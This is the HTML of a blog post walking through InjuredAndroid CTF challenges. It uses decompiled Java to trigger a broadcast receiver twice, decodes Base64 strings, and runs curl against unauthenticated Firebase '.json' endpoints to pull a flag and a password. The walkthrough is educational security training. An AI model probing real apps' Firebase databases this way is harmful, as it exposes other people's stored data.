        <span class="token function">setContentView</span><span class="token punctuation">(</span><span class="token class-name">R</span><span class="token punctuation">.</span>layout<span class="token punctuation">.</span>activity_flag_five<span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token function">m8078C</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token class-name">Toolbar</span><span class="token punctuation">)</span> <span class="token function">findViewById</span><span class="token punctuation">(</span><span class="token class-name">R</span><span class="token punctuation">.</span>id<span class="token punctuation">.</span>toolbar<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token class-name">FloatingActionButton</span><span class="token punctuation">)</span> <span class="token function">findViewById</span><span class="token punctuation">(</span><span class="token class-name">R</span><span class="token punctuation">.</span>id<span class="token punctuation">.</span>fab<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">setOnClickListener</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">View<span class="token punctuation">.</span>OnClickListener</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span> <span class="token comment">// from class: b3nac.injuredandroid.c</span>
            <span class="token annotation punctuation">@Override</span> <span class="token comment">// android.view.View.OnClickListener</span>
            <span class="token keyword">public</span> <span class="token keyword">final</span> <span class="token keyword">void</span> <span class="token function">onClick</span><span class="token punctuation">(</span><span class="token class-name">View</span> view<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
                <span class="token class-name">FlagFiveActivity</span><span class="token punctuation">.</span><span class="token keyword">this</span><span class="token punctuation">.</span><span class="token function">m4118G</span><span class="token punctuation">(</span>view<span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token punctuation">&#125;</span>
        <span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token keyword">new</span> <span class="token class-name">ComponentName</span><span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">,</span> <span class="token class-name">FlagFiveReceiver</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token function">getPackageManager</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token class-name">C0310a</span><span class="token punctuation">.</span><span class="token function">m8404b</span><span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">m8403c</span><span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">.</span>f4409x<span class="token punctuation">,</span> <span class="token keyword">new</span> <span class="token class-name">IntentFilter</span><span class="token punctuation">(</span><span class="token string">"com.b3nac.injuredandroid.intent.action.CUSTOM_INTENT"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token class-name">Button</span><span class="token punctuation">)</span> <span class="token function">findViewById</span><span class="token punctuation">(</span><span class="token class-name">R</span><span class="token punctuation">.</span>id<span class="token punctuation">.</span>button9<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">setOnClickListener</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">View<span class="token punctuation">.</span>OnClickListener</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span> <span class="token comment">// from class: b3nac.injuredandroid.b</span>
            <span class="token annotation punctuation">@Override</span> <span class="token comment">// android.view.View.OnClickListener</span>
            <span class="token keyword">public</span> <span class="token keyword">final</span> <span class="token keyword">void</span> <span class="token function">onClick</span><span class="token punctuation">(</span><span class="token class-name">View</span> view<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
                <span class="token class-name">FlagFiveActivity</span><span class="token punctuation">.</span><span class="token keyword">this</span><span class="token punctuation">.</span><span class="token function">m4117H</span><span class="token punctuation">(</span>view<span class="token punctuation">)</span><span class="token punctuation">;</span>   <span class="token comment">// invokes the intent</span>
            <span class="token punctuation">&#125;</span>
        <span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>From the above code, clicking flag2 button, we invoke intent which is defined in <strong><em>m4117H</em></strong> class.</p>
<p>An intent is used to perform an action on the screen. Therefore clicking the button element in our application we are invoking an new intent. Intents are used for sending a broadcast receiver.</p>
<pre class="line-numbers language-java" data-language="java"><code class="language-java"> <span class="token comment">/* renamed from: H */</span>
    <span class="token keyword">public</span> <span class="token comment">/* synthetic */</span> <span class="token keyword">void</span> <span class="token function">m4117H</span><span class="token punctuation">(</span><span class="token class-name">View</span> view<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
        <span class="token function">m4119F</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>

<span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">m4119F</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
        <span class="token function">sendBroadcast</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">Intent</span><span class="token punctuation">(</span><span class="token string">"com.b3nac.injuredandroid.intent.action.CUSTOM_INTENT"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>Analyzing component name <strong>FlagFiveReceiver</strong> class, when an intent is invoked twice, we get flag. The class implements a conditional if else loop condition for checking the number of intents. When the correct flag is displayed, the intents counter is set to zero( <strong>i2 &#x3D; 0</strong>), where <strong>i2</strong> variable is intent counter as shown in java code below.</p>
<pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">public</span> <span class="token keyword">final</span> <span class="token keyword">class</span> <span class="token class-name">FlagFiveReceiver</span> <span class="token keyword">extends</span> <span class="token class-name">BroadcastReceiver</span> <span class="token punctuation">&#123;</span>

    <span class="token comment">/* renamed from: a */</span>
    <span class="token keyword">private</span> <span class="token keyword">static</span> <span class="token keyword">int</span> f4410a<span class="token punctuation">;</span>

    <span class="token annotation punctuation">@Override</span> <span class="token comment">// android.content.BroadcastReceiver</span>
    <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">onReceive</span><span class="token punctuation">(</span><span class="token class-name">Context</span> context<span class="token punctuation">,</span> <span class="token class-name">Intent</span> intent<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
        <span class="token class-name">String</span> str<span class="token punctuation">;</span>
        <span class="token keyword">int</span> i<span class="token punctuation">;</span>
        <span class="token class-name">C2724g</span><span class="token punctuation">.</span><span class="token function">m881e</span><span class="token punctuation">(</span>context<span class="token punctuation">,</span> <span class="token string">"context"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token class-name">C2724g</span><span class="token punctuation">.</span><span class="token function">m881e</span><span class="token punctuation">(</span>intent<span class="token punctuation">,</span> <span class="token string">"intent"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token class-name">ApplicationC1492j</span><span class="token punctuation">.</span>f4506j<span class="token punctuation">.</span><span class="token function">m4062a</span><span class="token punctuation">(</span>context<span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token keyword">int</span> i2 <span class="token operator">=</span> f4410a<span class="token punctuation">;</span>
        <span class="token keyword">if</span> <span class="token punctuation">(</span>i2 <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
            <span class="token class-name">StringBuilder</span> sb <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">StringBuilder</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            sb<span class="token punctuation">.</span><span class="token function">append</span><span class="token punctuation">(</span><span class="token class-name">C2765h</span><span class="token punctuation">.</span><span class="token function">m809e</span><span class="token punctuation">(</span><span class="token string">"\n    Action: "</span> <span class="token operator">+</span> intent<span class="token punctuation">.</span><span class="token function">getAction</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">"\n\n    "</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            sb<span class="token punctuation">.</span><span class="token function">append</span><span class="token punctuation">(</span><span class="token class-name">C2765h</span><span class="token punctuation">.</span><span class="token function">m809e</span><span class="token punctuation">(</span><span class="token string">"\n    URI: "</span> <span class="token operator">+</span> intent<span class="token punctuation">.</span><span class="token function">toUri</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">"\n\n    "</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            str <span class="token operator">=</span> sb<span class="token punctuation">.</span><span class="token function">toString</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token class-name">C2724g</span><span class="token punctuation">.</span><span class="token function">m882d</span><span class="token punctuation">(</span>str<span class="token punctuation">,</span> <span class="token string">"sb.toString()"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token class-name">Log</span><span class="token punctuation">.</span><span class="token function">d</span><span class="token punctuation">(</span><span class="token string">"DUDE!:"</span><span class="token punctuation">,</span> str<span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>
            str <span class="token operator">=</span> <span class="token string">"Keep trying!"</span><span class="token punctuation">;</span>
            <span class="token keyword">if</span> <span class="token punctuation">(</span>i2 <span class="token operator">!=</span> <span class="token number">1</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
                <span class="token keyword">if</span> <span class="token punctuation">(</span>i2 <span class="token operator">==</span> <span class="token number">2</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span> <span class="token comment">//Number of times to invoke out intents</span>
                    <span class="token keyword">new</span> <span class="token class-name">FlagsOverview</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">m4087H</span><span class="token punctuation">(</span><span class="token boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
                    <span class="token keyword">new</span> <span class="token class-name">ApplicationC1492j</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">m4065b</span><span class="token punctuation">(</span>context<span class="token punctuation">,</span> <span class="token string">"flagFiveButtonColor"</span><span class="token punctuation">,</span> <span class="token boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
                    <span class="token class-name">Toast</span><span class="token punctuation">.</span><span class="token function">makeText</span><span class="token punctuation">(</span>context<span class="token punctuation">,</span> <span class="token string">"You are a winner "</span> <span class="token operator">+</span> <span class="token class-name">C1494k</span><span class="token punctuation">.</span><span class="token function">m4061a</span><span class="token punctuation">(</span><span class="token string">"Zkdlt0WwtLQ="</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">show</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
                    i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>
                    f4410a <span class="token operator">=</span> i<span class="token punctuation">;</span>
                <span class="token punctuation">&#125;</span>
                <span class="token class-name">Toast</span><span class="token punctuation">.</span><span class="token function">makeText</span><span class="token punctuation">(</span>context<span class="token punctuation">,</span> str<span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">show</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
                <span class="token keyword">return</span><span class="token punctuation">;</span>
            <span class="token punctuation">&#125;</span>
        <span class="token punctuation">&#125;</span>
        <span class="token class-name">Toast</span><span class="token punctuation">.</span><span class="token function">makeText</span><span class="token punctuation">(</span>context<span class="token punctuation">,</span> str<span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">show</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        i <span class="token operator">=</span> f4410a <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">;</span>
        f4410a <span class="token operator">=</span> i<span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>
<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p><strong>onReceive</strong> method is responsible for receiving intents sent. Invoking our Activity two times we get a flag.</p>
<p><img data-src="/images/android/flag5.png" alt="Flag Five"></p>
<p>The flag for challenge five is <strong>F1v3!</strong></p>
]]></content>
      <tags>
        <tag>android</tag>
        <tag>appsec</tag>
      </tags>
  </entry>
  <entry>
    <title>Android application security part2</title>
    <url>/2021/11/25/Android-appsec-part-2/</url>
    <content><![CDATA[<p>Second part series of the android application security. This part focuses on the security of sqlite databases, firebase and AWS security. <span id="more"></span></p>
<h2 id="Flag7-Sqlite"><a href="#Flag7-Sqlite" class="headerlink" title="Flag7 - Sqlite"></a>Flag7 - Sqlite</h2><p><strong>What is sqlite?</strong></p>
<p>Sqlite is a structure query base database that enables applications to do local storage in the application directory. The goal of the challenge is to understand how local storage of databases may lead to leakage of information.</p>
<p>First step is decompilation of <code>FlagSevenSqliteActivity</code> using <code>Jadx</code>.</p>
<p>Analysis of an new activity of android application, it is best to start at the onCreate method defined in the Activity.<strong>oncreate</strong> is the first method to be called by an application when an activity is started.</p>
<p>The decompiled <code>oncreate</code> method code is as shown below.</p>
<pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">onCreate</span><span class="token punctuation">(</span><span class="token class-name">Bundle</span> bundle<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
    <span class="token keyword">super</span><span class="token punctuation">.</span><span class="token function">onCreate</span><span class="token punctuation">(</span>bundle<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token function">setContentView</span><span class="token punctuation">(</span><span class="token class-name">R</span><span class="token punctuation">.</span>layout<span class="token punctuation">.</span>activity_flag_seven_sqlite<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token class-name">C</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token class-name">Toolbar</span><span class="token punctuation">)</span> <span class="token function">findViewById</span><span class="token punctuation">(</span><span class="token class-name">R</span><span class="token punctuation">.</span>id<span class="token punctuation">.</span>toolbar<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    j<span class="token punctuation">.</span>g<span class="token punctuation">.</span><span class="token function">a</span><span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token class-name">H</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token class-name">FloatingActionButton</span><span class="token punctuation">)</span> <span class="token function">findViewById</span><span class="token punctuation">(</span><span class="token class-name">R</span><span class="token punctuation">.</span>id<span class="token punctuation">.</span>fab<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">setOnClickListener</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token function">a</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token class-name">SQLiteDatabase</span> writableDatabase <span class="token operator">=</span> <span class="token keyword">this</span><span class="token punctuation">.</span>u<span class="token punctuation">.</span><span class="token function">getWritableDatabase</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token class-name">ContentValues</span> contentValues <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ContentValues</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    contentValues<span class="token punctuation">.</span><span class="token function">put</span><span class="token punctuation">(</span><span class="token string">"title"</span><span class="token punctuation">,</span> <span class="token class-name">Base64</span><span class="token punctuation">.</span><span class="token function">decode</span><span class="token punctuation">(</span><span class="token string">"VGhlIGZsYWcgaGFzaCE="</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    contentValues<span class="token punctuation">.</span><span class="token function">put</span><span class="token punctuation">(</span><span class="token string">"subtitle"</span><span class="token punctuation">,</span> <span class="token class-name">Base64</span><span class="token punctuation">.</span><span class="token function">decode</span><span class="token punctuation">(</span><span class="token string">"MmFiOTYzOTBjN2RiZTM0MzlkZTc0ZDBjOWIwYjE3Njc="</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    writableDatabase<span class="token punctuation">.</span><span class="token function">insert</span><span class="token punctuation">(</span><span class="token string">"Thisisatest"</span><span class="token punctuation">,</span> <span class="token keyword">null</span><span class="token punctuation">,</span> contentValues<span class="token punctuation">)</span><span class="token punctuation">;</span>
    contentValues<span class="token punctuation">.</span><span class="token function">put</span><span class="token punctuation">(</span><span class="token string">"title"</span><span class="token punctuation">,</span> <span class="token class-name">Base64</span><span class="token punctuation">.</span><span class="token function">decode</span><span class="token punctuation">(</span><span class="token string">"VGhlIGZsYWcgaXMgYWxzbyBhIHBhc3N3b3JkIQ=="</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    contentValues<span class="token punctuation">.</span><span class="token function">put</span><span class="token punctuation">(</span><span class="token string">"subtitle"</span><span class="token punctuation">,</span> h<span class="token punctuation">.</span><span class="token function">c</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    writableDatabase<span class="token punctuation">.</span><span class="token function">insert</span><span class="token punctuation">(</span><span class="token string">"Thisisatest"</span><span class="token punctuation">,</span> <span class="token keyword">null</span><span class="token punctuation">,</span> contentValues<span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>The method passes base64 encoded strings and stores them into string variables.From the “hint” of application name, we are creating a writable database through <code>SQLiteDatabase</code> functions. The activity writes some strings to the database. The database being referenced is called <strong>Thisisatest</strong>.</p>
<p>Next logical step is decoding the Base64 encoded strings to get the corresponding human readable form of data.</p>
<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">VGhlIGZsYWcgaGFzaCE    - The flag hash<span class="token operator">!</span>
MmFiOTYzOTBjN2RiZTM0MzlkZTc0ZDBjOWIwYjE3Njc - 2ab96390c7dbe3439de74d0c9b0b1767
VGhlIGZsYWcgaXMgYWxzbyBhIHBhc3N3b3JkIQ  - The flag is also a password<span class="token operator">!</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>

<p>The decoded strings as shown above give sus hints on solving the challenge.The author provides us with the hash of the flag.</p>
<p>For further analysis we decode even strings defined in the Activity as shown below.</p>
<pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">private</span> <span class="token keyword">final</span> <span class="token class-name">String</span> w <span class="token operator">=</span> <span class="token string">"ZjFhZy1wYTU1"</span><span class="token punctuation">;</span>   #f1ag<span class="token operator">-</span>pa55
<span class="token keyword">private</span> <span class="token keyword">byte</span><span class="token punctuation">[</span><span class="token punctuation">]</span> x <span class="token operator">=</span> <span class="token class-name">Base64</span><span class="token punctuation">.</span><span class="token function">decode</span><span class="token punctuation">(</span><span class="token string">"c3FsaXRl"</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  #sqlite
<span class="token keyword">private</span> <span class="token keyword">byte</span><span class="token punctuation">[</span><span class="token punctuation">]</span> y <span class="token operator">=</span> <span class="token class-name">Base64</span><span class="token punctuation">.</span><span class="token function">decode</span><span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">.</span>w<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token keyword">private</span> <span class="token keyword">final</span> <span class="token class-name">String</span> z<span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>

<p>Analyze <code>FlagSevensqliteActivity</code> in order to understand strings usage in our activity. Important strings are <strong>f1ag-pa55</strong> and <strong>sqlite</strong> guiding us in solving the problem.</p>
<pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">public</span> <span class="token class-name">FlagSevenSqliteActivity</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
    <span class="token keyword">byte</span><span class="token punctuation">[</span><span class="token punctuation">]</span> bArr <span class="token operator">=</span> <span class="token keyword">this</span><span class="token punctuation">.</span>x<span class="token punctuation">;</span>      <span class="token comment">//sqlite</span>
    d<span class="token punctuation">.</span>m<span class="token punctuation">.</span>b<span class="token punctuation">.</span>d<span class="token punctuation">.</span><span class="token function">b</span><span class="token punctuation">(</span>bArr<span class="token punctuation">,</span> <span class="token string">"decodedDirectoryOne"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token class-name">Charset</span> charset <span class="token operator">=</span> <span class="token class-name">StandardCharsets</span><span class="token punctuation">.</span>UTF_8<span class="token punctuation">;</span>
    d<span class="token punctuation">.</span>m<span class="token punctuation">.</span>b<span class="token punctuation">.</span>d<span class="token punctuation">.</span><span class="token function">b</span><span class="token punctuation">(</span>charset<span class="token punctuation">,</span> <span class="token string">"StandardCharsets.UTF_8"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">this</span><span class="token punctuation">.</span>z <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">String</span><span class="token punctuation">(</span>bArr<span class="token punctuation">,</span> charset<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">byte</span><span class="token punctuation">[</span><span class="token punctuation">]</span> bArr2 <span class="token operator">=</span> <span class="token keyword">this</span><span class="token punctuation">.</span>y<span class="token punctuation">;</span>        <span class="token comment">//f1ag-pa55</span>
    d<span class="token punctuation">.</span>m<span class="token punctuation">.</span>b<span class="token punctuation">.</span>d<span class="token punctuation">.</span><span class="token function">b</span><span class="token punctuation">(</span>bArr2<span class="token punctuation">,</span> <span class="token string">"decodedDirectoryTwo"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token class-name">Charset</span> charset2 <span class="token operator">=</span> <span class="token class-name">StandardCharsets</span><span class="token punctuation">.</span>UTF_8<span class="token punctuation">;</span>
    d<span class="token punctuation">.</span>m<span class="token punctuation">.</span>b<span class="token punctuation">.</span>d<span class="token punctuation">.</span><span class="token function">b</span><span class="token punctuation">(</span>charset2<span class="token punctuation">,</span> <span class="token string">"StandardCharsets.UTF_8"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token class-name"><span class="token namespace">this<span class="token punctuation">.</span></span>A</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">String</span><span class="token punctuation">(</span>bArr2<span class="token punctuation">,</span> charset2<span class="token punctuation">)</span><span class="token punctuation">;</span>
    f b2 <span class="token operator">=</span> f<span class="token punctuation">.</span><span class="token function">b</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    d<span class="token punctuation">.</span>m<span class="token punctuation">.</span>b<span class="token punctuation">.</span>d<span class="token punctuation">.</span><span class="token function">b</span><span class="token punctuation">(</span>b2<span class="token punctuation">,</span> <span class="token string">"FirebaseDatabase.getInstance()"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    d d2 <span class="token operator">=</span> b2<span class="token punctuation">.</span><span class="token function">d</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    d<span class="token punctuation">.</span>m<span class="token punctuation">.</span>b<span class="token punctuation">.</span>d<span class="token punctuation">.</span><span class="token function">b</span><span class="token punctuation">(</span>d2<span class="token punctuation">,</span> <span class="token string">"FirebaseDatabase.getInstance().reference"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token class-name"><span class="token namespace">this<span class="token punctuation">.</span></span>B</span> <span class="token operator">=</span> d2<span class="token punctuation">;</span>
    d h <span class="token operator">=</span> d2<span class="token punctuation">.</span><span class="token function">h</span><span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">.</span>z<span class="token punctuation">)</span><span class="token punctuation">;</span>
    d<span class="token punctuation">.</span>m<span class="token punctuation">.</span>b<span class="token punctuation">.</span>d<span class="token punctuation">.</span><span class="token function">b</span><span class="token punctuation">(</span>h<span class="token punctuation">,</span> <span class="token string">"database.child(refDirectory)"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token class-name"><span class="token namespace">this<span class="token punctuation">.</span></span>C</span> <span class="token operator">=</span> h<span class="token punctuation">;</span>
    d h2 <span class="token operator">=</span> <span class="token class-name"><span class="token namespace">this<span class="token punctuation">.</span></span>B</span><span class="token punctuation">.</span><span class="token function">h</span><span class="token punctuation">(</span><span class="token class-name"><span class="token namespace">this<span class="token punctuation">.</span></span>A</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    d<span class="token punctuation">.</span>m<span class="token punctuation">.</span>b<span class="token punctuation">.</span>d<span class="token punctuation">.</span><span class="token function">b</span><span class="token punctuation">(</span>h2<span class="token punctuation">,</span> <span class="token string">"database.child(refDirectoryTwo)"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token class-name"><span class="token namespace">this<span class="token punctuation">.</span></span>D</span> <span class="token operator">=</span> h2<span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span>
<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p><strong>flagSevensqliteActivity</strong> shows how application is parsing data from the Firebase instance. In order to understand the data being fetched, we need to know nodes we are fetching data from. From decompiled code, we are accessing the string x as shown in the constructor method in line 1 through <code>bArr</code> byte array. Our string is then passed to variable <code>z</code> constructor method as referenced <strong>this.z</strong> constructor.</p>
<p>This means <strong>f1ag-pa55</strong> and <strong>sqlite</strong> are our firebase nodes.</p>
<p>To get the firebase link, look for link in <strong>strings.xml</strong> in the resources directory of the application.The link of firebase url is shown in the image below. Manually test firebase endpoints manually to see if they are vulnerable as shown in the code below. Adding <code>.json</code> at the end of the firebase endpoint enables one to read data.</p>
<p>First, test endpoint using <strong>sqlite</strong> node.</p>
<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">vx@archie:output$ <span class="token function">curl</span> https://injuredandroid.firebaseio.com/sqlite.json
<span class="token string">"S3V3N_11"</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>

<p>From the above results, we get our flag. Accessing endpoint using <strong>f1ag-pa55</strong> using <code>.json</code> firebase trick, password.</p>
<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">vx@archie:output$ <span class="token function">curl</span> https://injuredandroid.firebaseio.com/f1ag-pa55.json
<span class="token string">"hunter2"</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>

<p><strong>hunter2</strong> is our correct password for the challenge.</p>
<h2 id="FLag8-AWS-Storage-and-Security"><a href="#FLag8-AWS-Storage-and-Security" class="headerlink" title="FLag8 - AWS Storage and Security."></a>FLag8 - AWS Storage and Security.</h2><p>Goal: Understanding misconfiguration of AWS storage and security implementation in the android applications.</p>
<p>Decompiled <code>flagEightclass</code> activity code looks like the one shown below.</p>
<pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">public</span> <span class="token class-name">FlagEightLoginActivity</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
    f b2 <span class="token operator">=</span> f<span class="token punctuation">.</span><span class="token function">b</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    d<span class="token punctuation">.</span>m<span class="token punctuation">.</span>b<span class="token punctuation">.</span>d<span class="token punctuation">.</span><span class="token function">b</span><span class="token punctuation">(</span>b2<span class="token punctuation">,</span> <span class="token string">"FirebaseDatabase.getInstance()"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    d d2 <span class="token operator">=</span> b2<span class="token punctuation">.</span><span class="token function">d</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    d<span class="token punctuation">.</span>m<span class="token punctuation">.</span>b<span class="token punctuation">.</span>d<span class="token punctuation">.</span><span class="token function">b</span><span class="token punctuation">(</span>d2<span class="token punctuation">,</span> <span class="token string">"FirebaseDatabase.getInstance().reference"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">this</span><span class="token punctuation">.</span>u <span class="token operator">=</span> d2<span class="token punctuation">;</span>
